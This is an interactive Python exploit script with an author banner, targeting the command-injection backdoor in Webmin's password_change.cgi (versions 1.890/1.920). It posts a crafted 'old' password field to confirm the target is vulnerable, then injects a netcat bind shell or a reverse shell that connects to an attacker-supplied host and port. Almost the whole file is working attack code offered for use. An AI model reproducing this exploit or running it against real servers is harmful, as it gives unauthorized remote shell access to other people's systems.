import os
import sys
import time
import platform
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def webmin_1890_exploit(url, lhost, lport, payload):
	"""Webmin 1.920 Exploit"""
	# Normalize Url ########
	if url.endswith('/'):
		url = url
	else:
		url = url + '/'
	########################

	p = 0

	# Select Payload #######
	if payload == 'nc_bind':
		p = 1
		pload = f'/bin/nc -lp {lport} -e /bin/bash'
	elif payload == 'nc_reverse':
		pload = f'/bin/nc {lhost} {lport} -e /bin/bash'
	else:
		print('\033[1;31m[-]\033[m Payload not found.')
		return False
	########################

	# Check/Exploit ##############

	uri_login = 'session_login.cgi'
	uri_exploit = 'password_change.cgi'

	url_login = url + uri_login
	url_exploit = url + uri_exploit

	headers = {
		'Referer': url_login,
		'Cookie': 'redirect=1; testing=1; sid=x; sessiontest=1',
		'Content-Type': 'application/x-www-form-urlencoded'
	}

	data = {
		'user': 'n3utr0n',
		'pam': '',
		'expired': '2',
		'old': 'echo|echo 7c434abf965aef231a229d28122e0af2',
		'new1': 'n3utr0n',
		'new2': 'n3utr0n',
	}

	res = requests.post(url_exploit, data=data, headers=headers)
	if '7c434abf965aef231a229d28122e0af2' in res.text:
		print('\033[1;32m[+]\033[m Target is vulnerable.')
		time.sleep(0.3)
		print('\033[1;34m[*]\033[m Sended Payload...')
		if p == 1:
			print(f'\033[1;35m[!]\033[m Try Connect in \033[1;31mTarget\033[m in Port \033[1;33m{lport}\033[m')

		data = {
			'user': 'n3utr0n',
			'pam': '',
			'expired': '2',
			'old': f'echo|{pload}',
			'new1': 'n3utr0n',
			'new2': 'n3utr0n',
		}

		requests.post(url_exploit, data=data, headers=headers)
	else:
		print('\033[1;31m[-]\033[m Target is not exploitable.\033[m')
		time.sleep(0.3)
		return False
	##############################


if __name__ == '__main__':
	if platform.system == 'Windows':
		os.system('cls')
	else:
		os.system('clear')

	print('''\033[1;33m
__      __   _          _              _  ___ ___ __  
\ \    / /__| |__ _ __ (_)_ _    ___  / |/ _ \_  )  \\ 
 \ \/\/ / -_) '_ \ '  \| | ' \  |___| | |\\_, // / () |
  \_/\_/\___|_.__/_|_|_|_|_||_|       |_(_)_//___\\__/ 
                                          
  	\033[1;31m[-] Coded by : N3utr0n
  	\033[1;32m[+] Date : 06/04/2022
  	\033[1;34m[*] Script : Webmin - 1.920
  	\033[1;35m[!] Facebook : https://m.facebook.com/miraldino.paulo.7\033[m
	''')
	try:
		url = input('(\033[1;31mWebmin 1.920\033[m)-(\033[1;31mURL\033[m) >\033[1;37m ')

		print('\n\033[1;35m[!]\033[m Payloads...\n')
		print('\033[1;33m[1].\033[1;36m Netcat Bind')
		print('\033[1;33m[2].\033[1;36m Netcat Reverse\n')
		payload = int(input('\033[m(\033[1;31mWebmin 1.920\033[m)-(\033[1;31mPayload\033[m) >\033[1;37m '))
		if payload == 1:
			payload = 'nc_bind'
			lhost = ''
			lport = int(input('\033[m(\033[1;31mWebmin 1.920\033[m)-(\033[1;31mLPORT\033[m) >\033[1;37m '))
			print()
			webmin_1890_exploit(url, lhost, lport, payload)
		elif payload == 2:
			payload = 'nc_reverse'
			lhost = input('\033[m(\033[1;31mWebmin 1.920\033[m)-(\033[1;31mLHOST\033[m) >\033[1;37m ')
			lport = int(input('\033[m(\033[1;31mWebmin 1.920\033[m)-(\033[1;31mLPORT\033[m) >\033[1;37m '))
			print()
			webmin_1890_exploit(url, lhost, lport, payload)
	except KeyboardInterrupt:
		print('\n\033[1;31m[-]\033[m Control C - Detected.')
		sys.exit(1)
	except Exception as e:
		print(f'\033[1;31m[-]\033[m Error {str(e)}')
		sys.exit(1)